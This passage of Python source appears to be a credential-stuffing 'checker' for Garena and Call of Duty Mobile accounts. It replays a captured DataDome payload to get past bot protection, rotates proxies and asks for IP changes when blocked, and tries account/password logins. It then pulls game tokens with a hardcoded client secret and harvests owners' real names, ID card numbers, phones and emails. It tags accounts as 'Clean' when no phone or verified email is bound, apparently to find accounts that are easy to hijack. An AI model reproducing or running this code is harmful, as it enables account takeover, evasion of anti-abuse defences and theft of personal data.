        '_ga': f'GA1.1.{random_id}.{timestamp}',
        '_ga_XB5PSHEQB4': f'GS2.1.s{timestamp}$o1$g0$t{timestamp}$j53$l0$h0',
        '_ga_1M7M9L6VPX': f'GS2.1.s{timestamp}$o6$g0$t{timestamp}$j60$l0$h0'
    }
    for name, value in ga_cookies.items():
        session.cookies.set(name, value, domain='.garena.com')
    return ga_cookies

_ip_wait_lock = threading.Lock()
_ip_wait_active = False
_ip_wait_event = threading.Event()
_suppress_ip_prints = False
_ip_block_callback = None

def get_datadome_cookie(session, proxies=None):
    url = 'https://datadome.garena.com/js/'
    headers = {
        'host': 'datadome.garena.com',
        'sec-ch-ua-platform': '"Android"',
        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36',
        'sec-ch-ua': '"Chromium";v="148", "Google Chrome";v="148", "Not/A)Brand";v="99"',
        'content-type': 'application/x-www-form-urlencoded',
        'sec-ch-ua-mobile': '?1',
        'accept': '*/*',
        'origin': 'https://account.garena.com',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://account.garena.com/',
        'accept-encoding': 'gzip, deflate, br, zstd',
        'accept-language': 'en-US,en;q=0.9',
        'priority': 'u=1, i'
    }
    payload = {
        'jspl': 'uhk7aBw8V8QkzKqkD7oowSyHXYy8ZX7MmiUVrKaorg4WGvVIeIUSbulWtdOJ-PUEdBXKeo0f3jFGgmzdlB85r2RTWFz9fVv5sihqWKKaYJ6CqD-x5zgp4GOG3qoJiFhGN4kuNWqswcZLbrpRGv_O6e2sAwpgKZ7UoEV71CS52-nzpUt2jfpFIwctsv3plEmyMubajP6vKWqxE6fF4kkWUvI8q9dzm6A5lBucuHv8D4ZIT-WHjjpgX1Q0FQkkEIjmpzHUxJ0DRxcPKRuxAUzAO6pONT5WAHDO1jKmP3X2um9tUpE2TL7uq4RFr39BXU1iVX-cCHBf_sW242UicatUznsEPvwDhgbbd7b3t1CWZ4bekhZNAa92m1_keFZXckvIVqAvC4nT35Ir9pKHWXIa15NRSZqUG32SVsipj9JUkNEStxCDYJqzBY-UMZeuXHIJdTitf1f0bndipuAe6bgF7yqCi7hIjD-PpV-L5RbW6i8HMiaxCiECXJUA6tebiecmDc1SZrhTDhWyD_jTwxjfveNNWKAsQH8EQ7G0xiD97wfxfNp7F2cdEcYj84ncOMT5BuhwIjhb8PwcPdu_bTVWbvSB6AgR0SJVShMjcVNKz9z2ol1m-lFkIMA78dlk-xqMBQa-P4V-UPqIwLHUsbhf4NP_CbSh49dkO2ul_jp3X-ZprX00HWUschukkHYxwuUd9ppO8L8dnaYVIFCltePBoWFTgaxjYrQEjuFbiy9uhMagFkGiLpt0JtBL0sGKM2JClV-KbTqDPix1hrTDU2LO20NFh6g8s3v42ix4zE6bqdijVO61jFYv2pZUJPGS6eTcKcLGbBwD1NYsI1aZ2OotVwX5i1udmlSjm3q_-7aguTeAWzmqZk36jUOrccoTnwAwDbRfpNqZU6gLVQs-xLYJhHCos3vGFCS-Ku4URj5fTmoZhdxqMViI-IaGQrEJ3qsEfuvi-ch9owf37yzu97gNduNAt0bhlHkE2BE05Yc-lcbcewv8yKp4F4G7ff-AlM3mejP6yhxvHuNqUXjLD-mXJ2axxVSfFep_Vh74lNGhTXbT4D_DfDohQonHT8U2Anml_5zsR8KFzVZRXn4HIbQcR_5E8PKijaoIU3OEhmjzMRledTIFLWD8gxruwMBMbgxFI11DxuwuIiCP4QFSMd9qItvv2lW5HXUN3tqdBf6ioXgCR1wkmZxwpXfbNrwovhZ9_58OvnplHBRFIj78DWKM5p2p83rXSpx6rH203gKthaI8XFJUBKtZZeW4TQB1fNaC_GCmw52cSPx7JdlP4JJkg43F8AXGcoQdGWmTLw_5aEH_glk2iFlH3UR6Q63h3a9CU6s6RcIDahxwRsx_GDmE-3yOuZ_aofpbq0gdZpfXf3lbRkUXPf52U-IMzWzFXTn23wzoauduqCFqomiuRr1lcInJQlZBk3n0gZRD_gA4MvKLChl8TAMbZfkqW56PIt1EAuKqFXzCfMtQa5fCdZ7NGrxhZ0iFedp446I9yP_GOjkNixwwLxSan4mmKLD9I4EZKves6_g4I0eFuFRep7MGKUrTbCc6CG4zB646VRJDN55PJqeJYA_H1yNQXOWfCyJHW3fK2G4u2CLbMyrHVw5ZCb_J2ScgqYRVKOUfGH31suG6mabkIonirhCf4qXfSUCwYeXL2L-Ka_EF28BSSO4tR6qnd8rHlZZvPQRrHuMuqthMkJxr7aW4GQUoewBYuQUienYbIIGv_Q86h2VA-kR_ibFE769ky5ALj2SPGBc_l0jSlhLGEO5ZX4UK_tVoREYH7Abn2pjhwnRGuvVGbTqb78yLLmhGSdgrIPAQLhkgoe-g9LSS0RoqNrrN3ffHDZ3mHIqI5MePIhmtI9ImH6mYk7tiqPvFLab6mvoTWTngVNe6bq51TxeHB1-Mnxe__4progZdJQndsIeSjyLkSGi2gDSH1tDCf3F4esSy-3YG1eZ3LG8pFbO9f3qS-lM0HQh2uKUa-Fa1ZvbHqXZkR46-_pIZpxai7QDm2EuwiR60p6e03FLIIn8DVM20KPsJp3KQlDhVP72sXewVMOVnedyiNT-XDhjJM7vqXetag8ctk9eXhKi3UTqj_PBK4mjQ-wSJ5REb2cwRW07jS_cxqcGTQOt7kgFHLoEWqFQ1qG2UJF2wjGR8MZ5oaUu6TTmQQBw1Pvu8qJEWTBMLcjTkP1VPse_YOuh_LggYMhZlPBLVnFRaOeMqV2Wd23ZAUxuwbjuY876AKFaUDS151nUdl8Asis9bN_ab7GNZ7OL3MaJ8vx7t6QerZUSuKY_ORWTw0Tlehb9VWmPNQRToNuZ6APk0ebEo2WHEdYewnKLwOvYG4ylIp12xYf2E1m1-3ajQHeUjGB__JpzADPIZsk654YNwPTyhINRDlSxOtCKKs0NOqM7i45ZLn9qDOjMIB-HQpKJsAxNFGCwGVqGd5X_ZOlotWW8jjZQ-57Wc3EiFqNM9aBB7FwBq6IeMOaqDNosY0EpLgJNUPC5zK8wX09BfqaUnsxE_Z-kYW639gJBIhyhCEbumEkV5-ZS4cXaO80n56XyMr8ZB4mSmTfYgg_n45xSvx07i1bZmfxT3YeQ8786d3lK3qMzlz828Og8L5-r7WqIQ5xAf00SBJ5aFuqXaunYMDUxMaF6Pku07heHKz66bAmdZL_6MYVbF3nfJhJWKrHIFa5yYK-KckQ2fwlpbKxitHDFrs0uUVSarjFrDS2cU8SDNUWMaT81waYXhX4FKV6fSjiJqIeiCKHHkkHHoAEkAAaVfZExm1sUvYickmv6w-hnpyhS1FOv4tFP2TcB1wuKhdpDuKKOxDMu4Qlps_ln88cYVUcrIyamgWr2hGwbho5T5_wuyaGD7LC63GV621TIxJ_P2TH5-dbtb26JF25CBGvu6bnJOXeRUBfUaJ9e2ZVs9iCvef0wvjQmGuHKOTfpTKhb6Mc2QV2wk7US-29PYUNS44_ivf272Acf2Zu4wtSedVWGEH0od9MiWEzdkW2n1pZK_zXPt-3cu3Jql7mF_yyRuKQfMfIMyiRnzIbnTKSOUxkRAnXPqP8tuDx--GUtMjwbnuK73qEB7oNcGCkrWIRifDskzeixKidgiNigmMrRjyqpTY5JzLm_ve5vVk-TyzAwmRwLvhANV4XxYjceRTau5XJLv3DjyxcbNZrzAv1KqMtwEdbCI3WJPkmnRe0vII9ipRgFJRZgX7qOOOHtJgKqv34suqJeJG9wRHujcmGr3ac1LhhWcfpDwWKgEPCvajN7o1XRFAt3JPPaXLclHCNZQD42O1-KieWNYscwhh0O1x8ozs5kx_JkmseBN3PH-VfehO38OgJnIh0EaHHjNxk25O04Y3pE46qOc3Xjrod7Z9zDA5EpjZZ2qP6-sYiGw0CDijEQ95w_EfF7EeZUwxGO1t0oIRp6XqrwG1D4FE_vTW84oJIW-jHPRUfK8HzGUyLJQWvsxxJgObltbdveTkynGZAarATYYprb6WEEULjJLjatZ2KTT3jJLBlAJ2RsbKLODGNgdoILt1gdxeyp-hBgOtPdINpbeTBXeK5uevKYM9z_jvctNj3m-dy03Xz6xKd0ZWT55Kobr1TyddHokG_lJDFFeZYjeHu9u7JWv2fYjpls1BAp8_paDg66fS6bJ_DjpMuqY1SchS0Ce0SmFuu9UcxGYVkeCox47zEMxFqTYNIfCVlIonJBu1SLs1_t4CgS1bLsbCrxCie6gnwYlj9x1NN-gwpzKTMowcH9mjJmEmhX_4s6f6tWU3CNNHZXESdtMqbZ8favw1y2_yQ8-gCoVF3iCMAJI5xCTyyWrM9Mir_DczIKoc4nGP4NWZ2ATyI01OB6Z2ZcbrndXeKsPUXqII8-OYwW3gJxGFOlOPFfq2CAldYjyzP9r5VLYbGQnelUtvE9GWSwfYYYPD_p3BAFs3GQ57ndvkxcTA8BtzXMdPucKaNmJIJi1IvbA4dnjAGqAyhlpeesEHHwG5hK7LAvMfbFtNiBjltzAPGjYwqxidr3bL-ANw08woJR8j9Tq7ENDXbqsi77YHI95srjtah_l4aiCT4zUvdT8e41Z3EsS2dCVG8MuPge5j93H7-Okcau8_-QwzeaW59wZfHfhlNOFgH177W0iFjnjSnA8UWZZ2KdIX9KbsgLUGBrN5U2WT4zjXuh9CbHvxGwpc2YpAKx-FCh1AJUTJzeHuphB7pUIni5ePV5KuCewwyEnXu5BaJbmR3g8YkoXbH9xjXnLy2KgS_OqBhyMt0xwwx7yBac7bPSCnVyZ2qduoGY9O3qZp7IvQ1QsW3ibNch33k8oAZLRjOS_UlfnPeVe3ALGIw2sZOY-06b3cGt9xTqDjDdrGBPuPGVF0y3YEHpVoK5K7KFTubDB_Y8rsdvWane0xkoDoF8M8gq_1E_Wr09TAndPx2lvKVoTLXPgQCH_eNzIds9Ec_I_SdiydIXmSVcv3w7PQyAtmhsK7Ga06gujlMHKri1zK1cDbPJdxeFHW7Bfwnn6Upbij9qHjF4mHYjgHn_zWVQxh4BBnkYsnBtapQOYEfO0MnX8eXhcidk5BeCTk4RC0fKSEp8-2DuDGPdpkHHtEKibkw64Mc41MJ4Tz1mAQKxaXbNa28snq1uonIzOi7P_mf5O6AEHfvN9ONc5oGg9wXcHsknNgICGEvnssQ8avliUyI9tkUxqrIyPn5aBdt2vQtDLKAucioT9bg',
        'eventCounters': '[]',
        'jsType': 'ch',
        'cid': 'ISkde2yWEsap_rca8kFx8KRU7KyOv16N2yKK8zLXVO1Y2Xa2i_akWInfmy~dIlJBLQcPaZq6tXXCwXC4FIo1dLi2ZUonhelNtFSZoyIsDdmX0uxT1InMizbY4~zZh3jJ',
        'ddk': 'AE3F04AD3F0D3A462481A337485081',
        'Referer': 'https://account.garena.com/',
        'request': '/',
        'responsePage': 'origin',
        'ddv': '5.6.6'
    }
    data = '&'.join((f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items()))
    try:
        response = session.post(url, headers=headers, data=data, proxies=proxies, timeout=30)
        response.raise_for_status()
        response_json = response.json()
        if response_json.get('status') == 200 and 'cookie' in response_json:
            cookie_string = response_json['cookie']
            if '=' in cookie_string and ';' in cookie_string:
                datadome = cookie_string.split(';')[0].split('=')[1]
            else:
                datadome = cookie_string
            return datadome
    except Exception:
        pass
    return None

class DataDomeManager:
    def __init__(self):
        self.current_datadome = None
        self.datadome_history = []
        self._403_attempts = 0

    def set_datadome(self, datadome_cookie):
        if datadome_cookie and datadome_cookie != self.current_datadome:
            self.current_datadome = datadome_cookie
            self.datadome_history.append(datadome_cookie)
            if len(self.datadome_history) > 10:
                self.datadome_history.pop(0)

    def get_datadome(self):
        return self.current_datadome

    def extract_datadome_from_session(self, session):
        try:
            cookies_dict = session.cookies.get_dict()
            datadome_cookie = cookies_dict.get('datadome')
            if datadome_cookie:
                self.set_datadome(datadome_cookie)
                return datadome_cookie
            return None
        except Exception:
            return None

    def clear_session_datadome(self, session):
        try:
            if 'datadome' in session.cookies:
                del session.cookies['datadome']
        except Exception:
            pass

    def set_session_datadome(self, session, datadome_cookie=None):
        try:
            self.clear_session_datadome(session)
            cookie_to_use = datadome_cookie or self.current_datadome
            if cookie_to_use:
                session.cookies.set('datadome', cookie_to_use, domain='.garena.com')
                return True
            return False
        except Exception:
            return False

    def get_current_ip(self):
        ip_services = ['https://api.ipify.org', 'https://icanhazip.com', 'https://ident.me', 'https://checkip.amazonaws.com']
        for service in ip_services:
            try:
                response = requests.get(service, timeout=8)
                if response.status_code == 200:
                    ip = response.text.strip()
                    if ip and '.' in ip:
                        return ip
            except Exception:
                continue
        return None

    def wait_for_ip_change(self, session, check_interval=5, max_wait_time=200):
        global _ip_wait_lock, _ip_wait_active, _ip_wait_event
        with _ip_wait_lock:
            if _ip_wait_active:
                is_primary = False
            else:
                _ip_wait_active = True
                _ip_wait_event.clear()
                is_primary = True
        if not is_primary:
            _ip_wait_event.wait(timeout=max_wait_time + 30)
            return True
        try:
            original_ip = self.get_current_ip()
            if not original_ip:
                if not _suppress_ip_prints:
                    _log('WARNING', 'IP BLOCKED — could not detect IP, waiting 10s')
                if _ip_block_callback:
                    _ip_block_callback(True)
                time.sleep(10)
                if _ip_block_callback:
                    _ip_block_callback(False)
                return True
            if not _suppress_ip_prints:
                _log('ERROR', f'IP BLOCKED — {original_ip}')
                _log('WARNING', 'Change your IP now — VPN / Mobile Data / Airplane Mode')
            if _ip_block_callback:
                _ip_block_callback(True)
            start_time = time.time()
            if not _suppress_ip_prints:
                while time.time() - start_time < max_wait_time:
                    time.sleep(check_interval)
                    current_ip = self.get_current_ip()
                    if current_ip and current_ip != original_ip:
                        _log('SUCCESS', f'IP changed: {original_ip} → {current_ip}')
                        if _ip_block_callback:
                            _ip_block_callback(False)
                        return True
                _log('ERROR', 'IP did not change within time limit')
                if _ip_block_callback:
                    _ip_block_callback(False)
                return False
            else:
                while time.time() - start_time < max_wait_time:
                    time.sleep(check_interval)
                    current_ip = self.get_current_ip()
                    if current_ip and current_ip != original_ip:
                        if _ip_block_callback:
                            _ip_block_callback(False)
                        return True
                if _ip_block_callback:
                    _ip_block_callback(False)
                return False
        finally:
            with _ip_wait_lock:
                _ip_wait_active = False
            _ip_wait_event.set()

    def handle_403(self, session):
        self._403_attempts += 1
        if self._403_attempts >= 3:
            if self.wait_for_ip_change(session):
                self._403_attempts = 0
                new_datadome = get_datadome_cookie(session)
                if new_datadome:
                    self.set_datadome(new_datadome)
                    self.set_session_datadome(session, new_datadome)
                return True
            else:
                return False
        return False

# ============ GARENA API ============

def prelogin(session, account, datadome_manager, cookie_manager, retries=3, proxy_manager=None):
    all_403 = True

    for attempt in range(retries):
        try:
            url = "https://sso.garena.com/api/prelogin"

            params = {
                "app_id": "10100",
                "account": account,
                "format": "json",
                "id": str(int(time.time() * 1000))
            }

            current_cookies = session.cookies.get_dict()
            cookie_parts = []

            for cookie_name in [
                "apple_state_key",
                "datadome",
                "sso_key",
                "_ga",
                "_ga_XB5PSHEQB4",
                "_ga_1M7M9L6VPX"
            ]:
                if cookie_name in current_cookies:
                    cookie_parts.append(
                        f"{cookie_name}={current_cookies[cookie_name]}"
                    )

            cookie_header = "; ".join(cookie_parts) if cookie_parts else ""

            headers = {
                "Host": "sso.garena.com",
                "Connection": "keep-alive",
                "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
                "Accept": "application/json, text/plain, */*",
                "sec-ch-ua-mobile": "?1",
                "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
                "sec-ch-ua-platform": '"Android"',
                "Sec-Fetch-Site": "same-origin",
                "Sec-Fetch-Mode": "cors",
                "Sec-Fetch-Dest": "empty",
                "Referer": "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-PH",
                "Accept-Encoding": "gzip, deflate, br",
                "Accept-Language": "en-PH,en-US;q=0.9,en;q=0.8",
            }

            if cookie_header:
                headers["Cookie"] = cookie_header

            response = session.get(
                url,
                headers=headers,
                params=params,
                timeout=30
            )

            if response.status_code == 403:
                proxy_dict = (
                    dict(session.proxies)
                    if hasattr(session, "proxies") and session.proxies
                    else None
                )

                fresh_dd = get_datadome_cookie(session, proxies=proxy_dict)

                if fresh_dd:
                    datadome_manager.set_datadome(fresh_dd)
                    datadome_manager.set_session_datadome(session, fresh_dd)
                else:
                    datadome_manager.handle_403(session)

                if attempt < retries - 1:
                    time.sleep(1)
                    continue

                all_403 = True
                break

            if response.status_code == 429:
                time.sleep(3)
                continue

            response.raise_for_status()

            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(2)
                    continue
                return (None, None, None)

            new_cookies = response.cookies.get_dict()
            new_datadome = new_cookies.get("datadome")

            if new_datadome:
                datadome_manager.set_datadome(new_datadome)

            if "error" in data:
                return (None, None, new_datadome)

            v1 = data.get("v1")
            v2 = data.get("v2")

            if not v1 or not v2:
                return (None, None, new_datadome)

            return (v1, v2, new_datadome)

        except requests.exceptions.ConnectionError:
            all_403 = False

            if proxy_manager and proxy_manager.is_loaded():
                session.proxies.clear()
                session.proxies.update(proxy_manager.get_next())

            if attempt < retries - 1:
                time.sleep(2)
                continue

        except requests.exceptions.Timeout:
            all_403 = False

            if proxy_manager and proxy_manager.is_loaded():
                session.proxies.clear()
                session.proxies.update(proxy_manager.get_next())

            if attempt < retries - 1:
                time.sleep(0.5)
                continue

        except Exception:
            all_403 = False

            if attempt < retries - 1:
                time.sleep(1)
                continue

    if all_403:
        return ("IP_BLOCKED", None, None)

    return (None, None, None)

def login(session, account, password, v1, v2):
    hashed_password = hash_password(password, v1, v2)

    url = "https://sso.garena.com/api/login"

    params = {
        "app_id": "10100",
        "account": account,
        "password": hashed_password,
        "redirect_uri": "https://account.garena.com/",
        "format": "json",
        "id": str(int(time.time() * 1000))
    }

    current_cookies = session.cookies.get_dict()
    cookie_parts = []

    for cookie_name in ["apple_state_key", "datadome", "sso_key"]:
        if cookie_name in current_cookies:
            cookie_parts.append(
                f"{cookie_name}={current_cookies[cookie_name]}"
            )

    cookie_header = "; ".join(cookie_parts) if cookie_parts else ""

    headers = {
        "Accept": "application/json, text/plain, */*",
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36",
        "Referer": "https://sso.garena.com/universal/login?app_id=10100&redirect_uri=https%3A%2F%2Faccount.garena.com%2F&locale=en-PH",
        "Accept-Language": "en-PH,en-US;q=0.9,en;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Host": "sso.garena.com",
        "Connection": "keep-alive",
        "sec-ch-ua": '"Chromium";v="139", "Not;A=Brand";v="99"',
        "sec-ch-ua-mobile": "?1",
        "sec-ch-ua-platform": '"Android"',
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Dest": "empty",
    }

    if cookie_header:
        headers["Cookie"] = cookie_header

    retries = 5

    for attempt in range(retries):
        try:
            response = session.get(
                url,
                headers=headers,
                params=params,
                timeout=30
            )
            response.raise_for_status()

            login_cookies = {}

            if "set-cookie" in response.headers:
                for cookie_str in response.headers["set-cookie"].split(","):
                    if "=" in cookie_str:
                        try:
                            cookie_name = cookie_str.split("=")[0].strip()
                            cookie_value = cookie_str.split("=")[1].split(";")[0].strip()

                            if cookie_name and cookie_value:
                                login_cookies[cookie_name] = cookie_value
                        except Exception:
                            pass

            try:
                for k, v in response.cookies.get_dict().items():
                    if k not in login_cookies:
                        login_cookies[k] = v
            except Exception:
                pass

            for k, v in login_cookies.items():
                if k in ["sso_key", "apple_state_key", "datadome"]:
                    session.cookies.set(k, v, domain=".garena.com")

            try:
                data = response.json()
            except json.JSONDecodeError:
                if attempt < retries - 1:
                    time.sleep(0.5)
                    continue
                return None

            sso_key = login_cookies.get("sso_key") or response.cookies.get("sso_key")

            if "error" in data:
                error_msg = data["error"]

                if error_msg in (
                    "ACCOUNT DOESNT EXIST",
                    "error_no_account",
                    "error_auth",
                    "error_user_ban",
                    "error_security_ban",
                ):
                    return f"permanent_fail:{error_msg}"

                if attempt < retries - 1:
                    time.sleep(2)
                    continue

                return None

            return sso_key

        except requests.RequestException:
            if attempt < retries - 1:
                time.sleep(0.5)
                continue

    return None

def get_codm_access_token(session):
    try:
        random_id = str(int(time.time() * 1000))
        grant_url = 'https://100082.connect.garena.com/oauth/token/grant'
        grant_headers = {
            'Host': '100082.connect.garena.com',
            'Connection': 'keep-alive',
            'sec-ch-ua-platform': '"Android"',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36; GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
            'Accept': 'application/json, text/plain, */*',
            'sec-ch-ua': '"Not(A:Brand";v="8", "Chromium";v="144", "Android WebView";v="144"',
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'sec-ch-ua-mobile': '?1',
            'Origin': 'https://100082.connect.garena.com',
            'X-Requested-With': 'com.garena.game.codm',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Dest': 'empty',
            'Referer': 'https://100082.connect.garena.com/universal/oauth?client_id=100082&locale=en-US&create_grant=true&login_scenario=normal&redirect_uri=gop100082://auth/&response_type=code',
            'Accept-Encoding': 'gzip, deflate, br, zstd',
            'Accept-Language': 'en-US,en;q=0.9'
        }
        device_id = f'02-{str(uuid.uuid4())}'
        grant_data = f'client_id=100082&redirect_uri=gop100082%3A%2F%2Fauth%2F&response_type=code&id={random_id}'
        grant_response = session.post(grant_url, headers=grant_headers, data=grant_data, timeout=15)
        grant_json = grant_response.json()
        auth_code = grant_json.get('code', '')
        if not auth_code:
            return ('', '', '')
        token_url = 'https://100082.connect.garena.com/oauth/token/exchange'
        token_headers = {
            'User-Agent': 'GarenaMSDK/5.12.1(Lenovo TB-9707F ;Android 15;en;us;)',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Host': '100082.connect.garena.com',
            'Connection': 'Keep-Alive',
            'Accept-Encoding': 'gzip'
        }
        token_data = f'grant_type=authorization_code&code={auth_code}&device_id={device_id}&redirect_uri=gop100082%3A%2F%2Fauth%2F&source=2&client_id=100082&client_secret=388066813c7cda8d51c1a70b0f6050b991986326fcfb0cb3bf2287e861cfa415'
        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=15)
        token_json = token_response.json()
        access_token = token_json.get('access_token', '')
        open_id = token_json.get('open_id', '')
        uid = token_json.get('uid', '')
        return (access_token, open_id, uid)
    except Exception:
        return ('', '', '')

def process_codm_callback(session, access_token, open_id=None, uid=None):
    try:
        old_callback_url = f'https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        old_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F) AppleWebKit/537.36 Chrome/144.0.0.0 Mobile Safari/537.36',
            'referer': 'https://auth.garena.com/'
        }
        old_response = session.get(old_callback_url, headers=old_headers, allow_redirects=False, timeout=15)
        location = old_response.headers.get('Location', '')
        if 'err=3' in location:
            return (None, 'no_codm')
        elif 'token=' in location:
            token = location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        aos_callback_url = f'https://api-delete-request-aos.codm.garena.co.id/oauth/callback/?access_token={access_token}'
        aos_headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
            'referer': 'https://100082.connect.garena.com/',
            'x-requested-with': 'com.garena.game.codm'
        }
        aos_response = session.get(aos_callback_url, headers=aos_headers, allow_redirects=False, timeout=15)
        aos_location = aos_response.headers.get('Location', '')
        if 'err=3' in aos_location:
            return (None, 'no_codm')
        elif 'token=' in aos_location:
            token = aos_location.split('token=')[-1].split('&')[0]
            return (token, 'success')
        return (None, 'unknown_error')
    except Exception:
        return (None, 'error')

def get_codm_user_info(session, token):
    try:
        try:
            import base64
            parts = token.split('.')
            if len(parts) == 3:
                payload = parts[1]
                padding = 4 - len(payload) % 4
                if padding != 4:
                    payload += '=' * padding
                decoded = base64.urlsafe_b64decode(payload)
                jwt_data = json.loads(decoded)
                user_data = jwt_data.get('user', {})
                if user_data:
                    return {
                        'codm_nickname': user_data.get('codm_nickname', user_data.get('nickname', 'N/A')),
                        'codm_level': user_data.get('codm_level', 'N/A'),
                        'region': user_data.get('region', 'N/A'),
                        'uid': user_data.get('uid', 'N/A'),
                        'open_id': user_data.get('open_id', 'N/A'),
                        't_open_id': user_data.get('t_open_id', 'N/A')
                    }
        except Exception:
            pass
        url = 'https://api-delete-request-aos.codm.garena.co.id/oauth/check_login/'
        headers = {
            'accept': 'application/json, text/plain, */*',
            'codm-delete-token': token,
            'origin': 'https://delete-request-aos.codm.garena.co.id',
            'referer': 'https://delete-request-aos.codm.garena.co.id/',
            'user-agent': 'Mozilla/5.0 (Linux; Android 15; Lenovo TB-9707F Build/AP3A.240905.015.A2; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/144.0.7559.59 Mobile Safari/537.36',
            'x-requested-with': 'com.garena.game.codm'
        }
        response = session.get(url, headers=headers, timeout=15)
        data = response.json()
        user_data = data.get('user', {})
        if user_data:
            return {
                'codm_nickname': user_data.get('codm_nickname', 'N/A'),
                'codm_level': user_data.get('codm_level', 'N/A'),
                'region': user_data.get('region', 'N/A'),
                'uid': user_data.get('uid', 'N/A'),
                'open_id': user_data.get('open_id', 'N/A'),
                't_open_id': user_data.get('t_open_id', 'N/A')
            }
        return {}
    except Exception:
        return {}

def check_codm_account(session, account):
    codm_info = {}
    has_codm = False
    try:
        access_token, open_id, uid = get_codm_access_token(session)
        if not access_token:
            return (has_codm, codm_info)
        codm_token, status = process_codm_callback(session, access_token, open_id, uid)
        if status == 'no_codm':
            return (has_codm, codm_info)
        elif status != 'success' or not codm_token:
            return (has_codm, codm_info)
        codm_info = get_codm_user_info(session, codm_token)
        if codm_info:
            has_codm = True
    except Exception:
        pass
    return (has_codm, codm_info)

# ============ PARSE ACCOUNT DETAILS ============

def parse_account_details(data):
    user_info = data.get('user_info', {})
    fb_username = 'N/A'
    fb_uid = 'N/A'
    if user_info.get('fb_account'):
        fb_username = user_info.get('fb_account', {}).get('fb_username', 'N/A')
        fb_uid = user_info.get('fb_account', {}).get('fb_uid', 'N/A')
    account_info = {
        'uid': user_info.get('uid', 'N/A'),
        'username': user_info.get('username', 'N/A'),
        'nickname': user_info.get('nickname', 'N/A'),
        'email': user_info.get('email', 'N/A'),
        'email_verified': bool(user_info.get('email_v', 0)),
        'email_verified_time': user_info.get('email_verified_time', 0),
        'email_verify_available': bool(user_info.get('email_verify_available', False)),
        'security': {
            'password_strength': user_info.get('password_s', 'N/A'),
            'two_step_verify': bool(user_info.get('two_step_verify_enable', 0)),
            'authenticator_app': bool(user_info.get('authenticator_enable', 0)),
            'facebook_connected': bool(user_info.get('is_fbconnect_enabled', False)),
            'facebook_account': user_info.get('fb_account', None),
            'suspicious': bool(user_info.get('suspicious', False))
        },
        'personal': {
            'real_name': user_info.get('realname', 'N/A'),
            'id_card': user_info.get('idcard', 'N/A'),
            'id_card_length': user_info.get('idcard_length', 'N/A'),
            'country': user_info.get('acc_country', 'N/A'),
            'country_code': user_info.get('country_code', 'N/A'),
            'mobile_no': user_info.get('mobile_no', 'N/A'),
            'mobile_binding_status': 'Bound' if user_info.get('mobile_binding_status', 0) else 'Not Bound',
            'extra_data': user_info.get('realinfo_extra_data', {})
        },
        'profile': {
            'avatar': user_info.get('avatar', 'N/A'),
            'signature': user_info.get('signature', 'N/A'),
            'shell_balance': user_info.get('shell', 0)
        },
        'status': {
            'account_status': 'Active' if user_info.get('status', 0) == 1 else 'Inactive',
            'whitelistable': bool(user_info.get('whitelistable', False)),
            'realinfo_updatable': bool(user_info.get('realinfo_updatable', False))
        },
        'facebook': {
            'fb_username': fb_username,
            'fb_uid': fb_uid
        },
        'binds': [],
        'game_info': []
    }
    mobile_no = account_info['personal']['mobile_no']
    email_verified = 1 if account_info['email_verified'] else 0
    mobile_is_na = mobile_no == 'N/A' or not mobile_no or str(mobile_no).strip() == ''
    is_clean = mobile_is_na and email_verified == 0
    email = account_info['email']
    id_card = account_info['personal']['id_card']
    if email and email != 'N/A' and str(email).strip() and (not email.startswith('***')):
        if email_verified == 1:
            account_info['binds'].append('Email (Verified)')
        else:
            account_info['binds'].append('Email')
    if not mobile_is_na:
        account_info['binds'].append('Phone')
    if account_info['security']['facebook_connected'] and fb_uid and (fb_uid != 'N/A'):
        account_info['binds'].append('Facebook')
    if id_card and id_card != 'N/A' and str(id_card).strip():
        account_info['binds'].append('ID Card')
    if account_info['security']['two_step_verify']:
        account_info['binds'].append('2FA')
    if account_info['security']['authenticator_app']:
        account_info['binds'].append('Authenticator')
    account_info['bind_status'] = 'Clean' if is_clean else f'Not Clean' if account_info['binds'] else 'Not Clean'
    account_info['is_clean'] = is_clean
    security_indicators = []
    if account_info['security']['two_step_verify']:
        security_indicators.append('2FA')
    if account_info['security']['authenticator_app']:
        security_indicators.append('Auth App')
    if account_info['security']['suspicious']:
        security_indicators.append('[WARNING] Suspicious')
    account_info['security_status'] = '[SUCCESS] Normal' if not security_indicators else ' | '.join(security_indicators)
    return account_info

